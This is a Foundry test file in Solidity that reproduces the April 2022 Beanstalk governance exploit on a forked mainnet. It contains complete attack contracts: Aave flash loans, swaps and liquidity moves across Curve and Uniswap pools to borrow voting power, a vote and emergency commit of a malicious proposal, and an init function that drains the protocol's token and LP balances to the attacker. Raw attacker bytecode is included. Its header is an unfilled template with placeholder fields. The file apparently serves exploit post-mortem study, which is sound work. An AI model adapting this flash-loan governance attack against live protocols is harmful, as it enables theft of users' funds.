// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../TestHarness.sol";
import {TokenBalanceTracker} from '../modules/TokenBalanceTracker.sol';

import {IERC20} from "../interfaces/IERC20.sol";
import {IWETH9} from '../interfaces/IWETH9.sol';

import {IUniswapV2Router02} from '../utils/IUniswapV2Router.sol';
import {IUniswapV2Pair} from '../utils/IUniswapV2Pair.sol';

// forge test --match-contract Exploit_Beanstalk -vvv
/*
On Apr 17, 2022 an attacker stole 25,000 ETH from an Beanstalk Governance.


// Attack Overview
Total Lost: $75MM (25,000 ETH)
Attack Tx: 
Ethereum Transaction Viewer: 

Exploited Contract: 
Attacker Address: 
Attacker Contract: 
Attack Block:  

// Key Info Sources
Twitter: 
Writeup: 
Article: 
Code: 


Principle: VULN PRINCIPLE


ATTACK:
1)

MITIGATIONS:
1)

*/
interface IUniswapV3Router {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

interface IDiamondCut {
    enum FacetCutAction {Add, Replace, Remove}

    struct FacetCut {
        address facetAddress;
        FacetCutAction action;
        bytes4[] functionSelectors;
    }
}

interface Ibeanstalk {

    struct DiamondCut {
        address facetAddress;
        uint8 action;
        bytes4[] functionSelectors;
    }

    function depositBeans(uint256 amount) external;
    function propose(IDiamondCut.FacetCut[] calldata _diamondCut, address _init, bytes calldata _calldata, uint8 _pauseOrUnpause) external;
    function deposit(address token, uint256 amount) external;
    function vote(uint32 bip) external;
    function emergencyCommit(uint32 bip) external;
}

interface IAaveFlashLoan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
  ) external;

}

interface IAaveDebtToken{
    function mintToTreasury(uint256 amount, uint256 index) external;
}

interface ICurve is IERC20 {
    function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external;
    function add_liquidity(uint256[3] memory amounts, uint256 min_mint_amount) external;
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
    function remove_liquidity_one_coin(uint256 amount, int128 i, uint256) external;
}

interface ICurveFactory {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

contract Exploit_Beanstalk is TestHarness, TokenBalanceTracker {
    address internal attacker = 0x1c5dCdd006EA78a7E4783f9e6021C32935a10fb4;

    IERC20 internal bean = IERC20(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);
    IWETH9 internal weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    Ibeanstalk internal beanstalk = Ibeanstalk(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);

    IUniswapV2Router02 internal router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    function setUp() external {
        cheat.createSelectFork('mainnet', 14602789); // One block before the first swap.

        cheat.label(attacker, "Attacker");

        cheat.deal(attacker, 100 ether); // received 100 ETH from a bridge.
        
        addTokenToTracker(address(bean));
        addTokenToTracker(address(weth));
        updateBalanceTracker(attacker);
    }

    function test_attack() external {
        console.log('===== Initial Balances =====');
        logBalancesWithLabel('Attacker', attacker);

        console.log('===== STEP 1: Swap ETH for BEAN =====');
        swapETHforBeans();
        logBalancesWithLabel('Attacker', attacker);

        console.log('===== STEP 2: Approve Beanstalk for BEAN =====');
        cheat.startPrank(attacker); // Impersonating the Attacker from this step.

        bean.approve(address(beanstalk), 1000000000000000000);

        console.log('===== STEP 3: Deposit Beans into beanstalk =====');
        beanstalk.depositBeans(bean.balanceOf(attacker));
        logBalancesWithLabel('Attacker', attacker);

        console.log('===== STEP 4: Deploy Donation Proposal Contract =====');
        address deployedDonationContract = deployDonationContract(bytes32(0));
        console.log('Donation contract deployed at:', deployedDonationContract);
        console.log('\n');

        console.log('===== STEP 5: Push proposal with unverified contract =====');
        IDiamondCut.FacetCut[] memory cut = new IDiamondCut.FacetCut[](0);
        bytes memory initSelector = abi.encodeWithSignature("init()");

        bytes memory nonVerifiedContract = hex'608060405232731c5dcdd006ea78a7e4783f9e6021c32935a10fb4146100585760405162461bcd60e51b815260206004820152600a6024820152692737ba1029b4b3b732b960b11b604482015260640160405180910390fd5b6040516370a0823160e01b815230600482015273dc59ac4fefa32293a95889dc396682858d52e5db9063a9059cbb90339083906370a0823190602401602060405180830381865afa1580156100b1573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100d5919061040d565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af1158015610120573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101449190610426565b506040516370a0823160e01b81523060048201527387898263b6c5babe34b4ec53f22d98430b91e3719063a9059cbb90339083906370a0823190602401602060405180830381865afa15801561019e573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101c2919061040d565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af115801561020d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102319190610426565b506040516370a0823160e01b8152306004820152733a70dfa7d2262988064a2d051dd47521e43c9bdd9063a9059cbb90339083906370a0823190602401602060405180830381865afa15801561028b573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102af919061040d565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af11580156102fa573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061031e9190610426565b506040516370a0823160e01b815230600482015273d652c40fbb3f06d6b58cb9aa9cff063ee63d465d9063a9059cbb90339083906370a0823190602401602060405180830381865afa158015610378573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061039c919061040d565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303816000875af11580156103e7573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061040b9190610426565b005b60006020828403121561041f57600080fd5b5051919050565b60006020828403121561043857600080fd5b8151801515811461044857600080fd5b939250505056fea164736f6c634300080d000a';
        address unverifiedContract = precomputeAddress(nonVerifiedContract, 0);
        beanstalk.propose(cut, unverifiedContract, initSelector, 3); 

        console.log('===== STEP 6: Push proposal with Donation Contract =====');
        beanstalk.propose(cut, deployedDonationContract, initSelector, 3); 

        console.log('===== STEP 7: Sends 0.25 ETH to unverified contract =====');
        (bool success, ) = unverifiedContract.call{value: 0.25 ether}("");
        require(success);
        logBalancesWithLabel('Attacker', attacker);
        logBalancesWithLabel('Non Verified Contract', unverifiedContract);

        // console.log('===== STEP 8: Deploys Unverified Contract =====');
        // address effectiveDeployAddr = create2Deploy(nonVerifiedContract, 0); // This is failing.
        // console.log(effectiveDeployAddr);
        // require(effectiveDeployAddr == unverifiedContract, 'Unverified contract not deployed');

        console.log('===== STEP 8: Deploys Flashloaner Contract =====');
        address loanerAttacker = address(new Exploit{salt: bytes32(0)}());

        Exploit(payable(loanerAttacker)).execute();
    }

    function swapETHforBeans() internal {
        address[] memory _path = new address[](2);
        _path[0] = address(weth);
        _path[1] = address(bean);

        cheat.prank(attacker);
        router.swapExactETHForTokens{value: 73 ether}(211000000000, _path, attacker, 1650098340545);
    }

    function deployDonationContract(bytes32 _salt) internal returns(address){
        return address(new InitBip18{salt: _salt}());
    }

    function isDeployedContract(address _address) internal view returns(bool){
        return(_address.code.length > 0);
    }

    function create2Deploy(bytes memory bytecode, uint256 _salt) public payable returns(address){
        address addr;
        assembly {
            addr := create2(
                callvalue(), // wei sent with current call
                // Actual code starts after skipping the first 32 bytes
                add(bytecode, 0x20),
                mload(bytecode), // Load the size of code contained in the first 32 bytes
                _salt // Salt from function arguments
            )

            if iszero(extcodesize(addr)) {
                revert(0, 0)
            }
        }
        return addr;
    }

    function precomputeAddress(bytes memory bytecode, uint256 _salt)
        public
        view
        returns (address)
    {
        bytes32 hash = keccak256(
            abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode))
        );

        // NOTE: cast last 20 bytes of hash to address
        return address(uint160(uint(hash)));
    }
}

// Pretty interesting contracts..
// Ukraine Donation Proposal
// Give 250,000 Bean to Ukraine (and 10,000 Bean to the proposer)
abstract contract IBean {
    function mint(address account, uint256 amount) public virtual returns (bool);
}

contract InitBip18 {
    address private constant bean = 0xDC59ac4FeFa32293A95889Dc396682858d52e5Db; // Bean Address
    address private constant proposerWallet = 0xE5eCF73603D98A0128F05ed30506ac7A663dBb69; // Proposer Wallet
    address private constant ukraineWallet = 0x165CD37b4C644C2921454429E7F9358d18A45e14; // Ukraine Wallet
    uint256 private constant proposerAmount = 10_000 * 1e6; // 10,000 Beans
    uint256 private constant donationAmount = 250_000 * 1e6; // 250,000 Beans

    function init() external {
        IBean(bean).mint(proposerWallet, proposerAmount);
        IBean(bean).mint(ukraineWallet, donationAmount);
    }
}


contract FlashLoanAttacker is TokenBalanceTracker{
    address[] public tokens = [
        address(bean), 
        address(dai), 
        address(usdc), 
        address(usdt), 
        address(lusd), 
        address(curve3Crv), 
        address(weth)
    ];

    IERC20 internal constant bean = IERC20(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);
    IERC20 internal constant dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 internal constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 internal constant usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 internal constant lusd = IERC20(0x5f98805A4E8be255a32880FDeC7F6728C6568bA0);
    IERC20 internal constant curve3Crv = IERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
    IWETH9 internal constant weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    ICurve internal constant curveStablesPool = ICurve(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
    ICurve internal constant curveFactory = ICurve(0xEd279fDD11cA84bEef15AF5D39BB4d4bEE23F0cA);
    ICurve internal constant curveBeanCRV = ICurve(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
    ICurve internal constant curveBeanLusd = ICurve(0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D);

    address public beanstalk = 0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5;

    IUniswapV2Pair internal sushiLusdOhm = IUniswapV2Pair(0x46E4D8A1322B9448905225E52F914094dBd6dDdF);
    IUniswapV2Pair internal beanWethPair = IUniswapV2Pair(0x87898263B6C5BABe34b4ec53F22d98430b91e371);

    IAaveFlashLoan internal aaveV2 = IAaveFlashLoan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    IUniswapV2Router02 internal routerv2 = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV3Router internal routerv3 = IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    uint256 amountsSwapped;
    uint256 beanReceivedAfterSwap;

    constructor() {
        addTokensToTracker(tokens);
    }


    function flashLoanAave() public {
        address[] memory assets = new address[](3);
        assets[0] = address(dai); 
        assets[1] = address(usdc); 
        assets[2] = address(usdt); 

        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 350000000000000000000000000; // DAI
        amounts[1] = 500000000000000; // USDC
        amounts[2] = 150000000000000; // USDT

        aaveV2.flashLoan(address(this), assets, amounts, new uint256[](3), address(this), new bytes(0), 0);
        
        uint256 daiBalance = dai.balanceOf(address(this));
        uint256 usdcBalance = usdc.balanceOf(address(this));
        uint256 usdtBalance = usdt.balanceOf(address(this));
        dai.approve(address(routerv3), type(uint256).max);
        usdc.approve(address(routerv3), type(uint256).max);
        usdt.approve(address(routerv3), type(uint256).max);

        uint24 poolFee = 3000;

        IUniswapV3Router.ExactInputSingleParams memory params = IUniswapV3Router.ExactInputSingleParams({
            tokenIn: address(dai), 
            tokenOut: address(weth),
            fee: poolFee,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: daiBalance,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0       
        });
        routerv3.exactInputSingle(params);
        
        params.tokenIn = address(usdc);
        params.amountIn = usdcBalance;
        routerv3.exactInputSingle(params);

        params.tokenIn = address(usdt);
        params.amountIn = usdtBalance;
        routerv3.exactInputSingle(params);

        weth.withdraw(weth.balanceOf(address(this)));
        payable(msg.sender).transfer(address(this).balance);
    }

    // Aave Callback
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata,
        uint256[] calldata,
        address,
        bytes calldata
        ) external returns(bool){
        // require(msg.sender == address(aaveV2), 'Only callable by aave');
        // logBalancesWithLabel('Flashloaner after Loan', address(this));

        uint256 beansPairBalance = bean.balanceOf(address(beanWethPair));
        
        beanWethPair.swap(0, (beansPairBalance * 99) / 100, address(this), new bytes(1));
        
        lusd.approve(address(curveFactory), type(uint256).max);
        curveFactory.exchange(0, 1, lusd.balanceOf(address(this)), 0);

        for(uint256 i = 0; i < assets.length; ){ // Approve only USDC, USDT, DAI
            IERC20(assets[i]).approve(address(aaveV2), type(uint256).max);
            unchecked{
                ++i;
            }
        }

        // Remove liquidity and pay loan
        uint256 crvToReturn = curve3Crv.balanceOf(address(this));
        curveStablesPool.remove_liquidity_one_coin((crvToReturn * 35)/100, 0, 0);
        curveStablesPool.remove_liquidity_one_coin((crvToReturn * 50)/100, 1, 0);
        curveStablesPool.remove_liquidity_one_coin((crvToReturn * 15)/100, 2, 0);

        beanWethPair.approve(address(routerv2), type(uint256).max);
        routerv2.removeLiquidityETH(address(bean), beanWethPair.balanceOf(address(this)), 0, 0, address(this), block.timestamp);

        return true;
    }

    function uniswapV2Call(address , uint256 amount0, uint256 amount1, bytes memory ) external {
        amountsSwapped++;

        if(amountsSwapped == 1) {   // Swap for LUSD
            beanReceivedAfterSwap = bean.balanceOf(address(this));
            uint256 lusdToRequest = lusd.balanceOf(address(sushiLusdOhm));

            sushiLusdOhm.swap( (lusdToRequest * 99) / 100, 0, address(this), new bytes(1));

            require(bean.transfer(address(beanWethPair), (beanReceivedAfterSwap * 1000) / 993 + 1), "Failed to repay BEAN");
        }

        if(amountsSwapped == 2){ // Manipulte Votes

            addLiquidityToStableCurve();
            exchangeCurveLusd();
            addLiquidityToBeansPool();
            addLiquidityToBeansLusdPool();
            depositVoteExecute();

            uint256 lusdToRepay = amount0 * 1000 / 997 + 1;
            require(lusd.transfer(address(sushiLusdOhm), lusdToRepay), "Failed to repay LUSD");
        }
    }

    function addLiquidityToStableCurve() private {
        uint256[3] memory amounts;
        amounts[0] = dai.balanceOf(address(this)); 
        amounts[1] = usdc.balanceOf(address(this));
        amounts[2] = usdt.balanceOf(address(this)); 

        dai.approve(address(curveStablesPool), type(uint256).max);
        usdc.approve(address(curveStablesPool), type(uint256).max);
        usdt.approve(address(curveStablesPool), type(uint256).max);

        curveStablesPool.add_liquidity(amounts, 0);
    }

    function exchangeCurveLusd() internal {
        curve3Crv.approve(address(curveFactory), type(uint256).max);
        curveFactory.exchange(1, 0, 15000000000000000000000000, 0);
    }

    function addLiquidityToBeansPool() internal {
        uint256[2] memory amounts2;
        amounts2[0] = 0;
        amounts2[1] = curve3Crv.balanceOf(address(this));
        curve3Crv.approve(address(curveBeanCRV), type(uint256).max);
        curveBeanCRV.add_liquidity(amounts2, 0); 
    }

    function addLiquidityToBeansLusdPool() internal {
        uint256 lusdBalance = lusd.balanceOf(address(this));
        uint256 beansBalance = bean.balanceOf(address(this));

        uint256[2] memory amounts;
        amounts[0] = beansBalance;
        amounts[1] = lusdBalance;

        lusd.approve(address(curveBeanLusd), type(uint256).max);
        bean.approve(address(curveBeanLusd), type(uint256).max);

        curveBeanLusd.add_liquidity(amounts, 0);
    }

    function depositVoteExecute() internal {
        curveBeanCRV.approve(beanstalk, type(uint256).max);
        curveBeanLusd.approve(beanstalk, type(uint256).max);

        Ibeanstalk(beanstalk).deposit(address(curveBeanCRV), curveBeanCRV.balanceOf(address(this))); 
        Ibeanstalk(beanstalk).deposit(address(curveBeanLusd), curveBeanLusd.balanceOf(address(this))); 

        Ibeanstalk(beanstalk).vote(20);

        Ibeanstalk(beanstalk).emergencyCommit(20);

        curveBeanCRV.remove_liquidity_one_coin(curveBeanCRV.balanceOf(address(this)), 1, 0);
        curveBeanLusd.remove_liquidity_one_coin(curveBeanLusd.balanceOf(address(this)), 1, 0);
    }

    receive() external payable{}
}



// This was a non verified contract. Constructed by decoding the bytecode and from the following link: https://github.com/JIAMING-LI/BeanstalkProtocolExploit/blob/master/contracts/ExploitBip.sol
contract ExploitBip {
    IERC20 private constant beans = IERC20(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);
    IERC20 private constant beans3Crv = IERC20(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
    IERC20 private constant beansLusd = IERC20(0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D);
    IERC20 private constant beansWethPair = IERC20(0x87898263B6C5BABe34b4ec53F22d98430b91e371);
    
    address private constant beansProtocol = 0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5;

    function init() external {
        uint beansBalance =  beans.balanceOf(beansProtocol);
        if(beansBalance > 0) {
            beans.transfer(msg.sender, beansBalance);
        }

        uint beans3CrvBalance = beans3Crv.balanceOf(beansProtocol);
        if(beans3CrvBalance > 0) {
            beans3Crv.transfer(msg.sender, beans3CrvBalance);
        }

        uint beansLusdBalance = beansLusd.balanceOf(beansProtocol);
        if(beansLusdBalance > 0) {
            beansLusd.transfer(msg.sender, beansLusdBalance);
        }

        uint beansWethLpBalance = beansWethPair.balanceOf(beansProtocol);
        if(beansWethLpBalance > 0) {
            beansWethPair.transfer(msg.sender, beansWethLpBalance);
        }
    }
}


interface IBeanstalkProtocolDiamond {
    //SiloFacet
    function depositBeans(uint256 amount) external;

    //GovernanceFacet
    function propose(
        IDiamondCut.FacetCut[] calldata _diamondCut,
        address _init,
        bytes calldata _calldata,
        uint8 _pauseOrUnpause
    ) external;

    function vote(uint32 bip) external;
    function emergencyCommit(uint32 bip) external;

    //SiloV2Facet
    function deposit(address token, uint256 amount) external;
}

interface IWETH is IERC20 {
    function withdraw(uint256) external;
}

interface IAaveLendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;

}

interface IFlashLoanReceiver {
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

interface IUniswapV2Router {
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
}

interface ICurvePool is IERC20 {
    function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external;
    function add_liquidity(uint256[3] memory amounts, uint256 min_mint_amount) external;
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
    function remove_liquidity_one_coin(uint256 amount, int128 i, uint256) external;
}


interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

contract Exploit is IFlashLoanReceiver,  IUniswapV2Callee{
    IBeanstalkProtocolDiamond private constant beanstalkProtocol = IBeanstalkProtocolDiamond(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);
    IAaveLendingPool private constant aaveLendingPool = IAaveLendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    IUniswapV2Pair private constant lusdOhmPair = IUniswapV2Pair(0x46E4D8A1322B9448905225E52F914094dBd6dDdF);
    IUniswapV2Pair private constant beansWethPair = IUniswapV2Pair(0x87898263B6C5BABe34b4ec53F22d98430b91e371);

    IERC20 private constant beans = IERC20(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 private constant USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 private constant LUSD = IERC20(0x5f98805A4E8be255a32880FDeC7F6728C6568bA0);
    IERC20 private constant Curve3Crv = IERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    ICurvePool private constant curve3pool = ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
    ICurvePool private constant curveExchange = ICurvePool(0xEd279fDD11cA84bEef15AF5D39BB4d4bEE23F0cA);
    ICurvePool private constant curveBeans3CrvPool = ICurvePool(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
    ICurvePool private constant curveBeansLusdPool = ICurvePool(0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D);

    IUniswapV3Router private constant uniswapV3Router = IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    IUniswapV2Router private constant uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    uint256 private constant UINT256_MAX = type(uint256).max;

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata,
        uint256[] calldata,
        address,
        bytes calldata
    ) external override returns (bool) {
        uint256 beansBalance = beans.balanceOf(address(beansWethPair));
        beansWethPair.swap(0, (beansBalance * 99) / 100, address(this), new bytes(1));
        LUSD.approve(address(curveExchange), UINT256_MAX);
        curveExchange.exchange(0, 1, LUSD.balanceOf(address(this)), 0);
        for(uint i = 0; i < assets.length; i++) {
            IERC20(assets[i]).approve(address(aaveLendingPool), UINT256_MAX);
        }

        //remove liqudity to return AAVE flash loan
        uint256 threeCrvBalance = Curve3Crv.balanceOf(address(this));
        curve3pool.remove_liquidity_one_coin((threeCrvBalance * 35)/100, 0, 0);
        curve3pool.remove_liquidity_one_coin((threeCrvBalance * 50)/100, 1, 0);
        curve3pool.remove_liquidity_one_coin((threeCrvBalance * 15)/100, 2, 0);

        beansWethPair.approve(address(uniswapV2Router), UINT256_MAX);
        uniswapV2Router.removeLiquidityETH(address(beans), beansWethPair.balanceOf(address(this)), 0, 0, address(this), block.timestamp);
        return true;
    }

    function uniswapV2Call(
        address,
        uint amount0,
        uint amount1,
        bytes calldata
    ) external override {
        if(msg.sender == address(beansWethPair)) {
            uint256 lusdBalance = LUSD.balanceOf(address(lusdOhmPair));
            lusdOhmPair.swap((lusdBalance * 99)/100, 0, address(this), new bytes(1));

            //return Beans flash loan
            uint256 repayBeansAmount = amount1 + amount1 * 3/997 + 1;
            beans.transfer(address(beansWethPair), repayBeansAmount);
        } else {
            addCurve3PoolLiquidity();
            exchange3CrvToLusd();
            addLiquidityToBeans3CrvPool();
            addLiquidityToBeansLusdCurvePool();
            depositVoteAndExecute();

            //return Lusd flash loan
            uint256 repayLusdAmount = amount0 + amount0 * 3 / 997 + 1;
            LUSD.transfer(address(lusdOhmPair), repayLusdAmount);
        }
    }

    function addCurve3PoolLiquidity() private {
        uint256 daiBalance = DAI.balanceOf(address(this));
        uint256 usdcBalance = USDC.balanceOf(address(this));
        uint256 usdtBalance = USDT.balanceOf(address(this));
        address curve3poolAddr = address(curve3pool);
        DAI.approve(curve3poolAddr, UINT256_MAX);
        USDC.approve(curve3poolAddr, UINT256_MAX);
        USDT.approve(curve3poolAddr, UINT256_MAX);

        uint256[3] memory amounts;
        amounts[0] = daiBalance;
        amounts[1] = usdcBalance;
        amounts[2] = usdtBalance;
        curve3pool.add_liquidity(amounts, 0);
    }

    function exchange3CrvToLusd() private {
        Curve3Crv.approve(address(curveExchange), UINT256_MAX);
        curveExchange.exchange(1, 0, 15000000e18, 0);
    }

    function addLiquidityToBeans3CrvPool() private {
        uint256 curve3CrvBalance = Curve3Crv.balanceOf(address(this));
        Curve3Crv.approve(address(curveBeans3CrvPool), UINT256_MAX);
        uint256[2] memory amounts;
        amounts[1] = curve3CrvBalance;
        curveBeans3CrvPool.add_liquidity(amounts, 0);
    }

    function addLiquidityToBeansLusdCurvePool() private {
        uint256 lusdBalance = LUSD.balanceOf(address(this));
        uint256 beansBalance = beans.balanceOf(address(this));
        beans.approve(address(curveBeansLusdPool), UINT256_MAX);
        LUSD.approve(address(curveBeansLusdPool), UINT256_MAX);
        uint256[2] memory amounts;
        amounts[0] = beansBalance;
        amounts[1] = lusdBalance;
        curveBeansLusdPool.add_liquidity(amounts, 0);

    }

    function depositVoteAndExecute() private {
        depositForVotingPower();
        beanstalkProtocol.vote(20);
        beanstalkProtocol.emergencyCommit(20);
        uint256 beans3crvBalance = curveBeans3CrvPool.balanceOf(address(this));
        uint256 beansLusdBalance = curveBeansLusdPool.balanceOf(address(this));
        curveBeans3CrvPool.remove_liquidity_one_coin(beans3crvBalance, 1, 0);
        curveBeansLusdPool.remove_liquidity_one_coin(beansLusdBalance, 1, 0);
    }

    function depositForVotingPower() private {
        //deposit to beans3Crv and beansLusd to get voting power
        uint256 beans3crvBalance = curveBeans3CrvPool.balanceOf(address(this));
        uint256 beansLusdBalance = curveBeansLusdPool.balanceOf(address(this));
        curveBeans3CrvPool.approve(address(beanstalkProtocol), UINT256_MAX);
        curveBeansLusdPool.approve(address(beanstalkProtocol), UINT256_MAX);
        beanstalkProtocol.deposit(address(curveBeans3CrvPool), beans3crvBalance);
        beanstalkProtocol.deposit(address(curveBeansLusdPool), beansLusdBalance);
    }

    function execute() external {
        address[] memory tokens = new address[](3);
        tokens[0] = address(DAI);
        tokens[1] = address(USDC);
        tokens[2] = address(USDT);

        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 350000000e18;
        amounts[1] = 500000000e6;
        amounts[2] = 150000000e6;
        aaveLendingPool.flashLoan(
            address(this),
            tokens,
            amounts,
            new uint256[](3),
            address(this),
            new bytes(0),
            0
        );

        uint256 daiBalance = DAI.balanceOf(address(this));
        uint256 usdcBalance = USDC.balanceOf(address(this));
        uint256 usdtBalance = USDT.balanceOf(address(this));
        DAI.approve(address(uniswapV3Router), UINT256_MAX);
        USDC.approve(address(uniswapV3Router), UINT256_MAX);
        USDT.approve(address(uniswapV3Router), UINT256_MAX);
        uint24 poolFee = 3000;
        IUniswapV3Router.ExactInputSingleParams memory params = IUniswapV3Router.ExactInputSingleParams({
            tokenIn: address(DAI),
            tokenOut: address(WETH),
            fee: poolFee,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: daiBalance,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0       
        });
        uniswapV3Router.exactInputSingle(params);
        
        params.tokenIn = address(USDC);
        params.amountIn = usdcBalance;
        uniswapV3Router.exactInputSingle(params);

        params.tokenIn = address(USDT);
        params.amountIn = usdtBalance;
        uniswapV3Router.exactInputSingle(params);

        WETH.withdraw(WETH.balanceOf(address(this)));
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}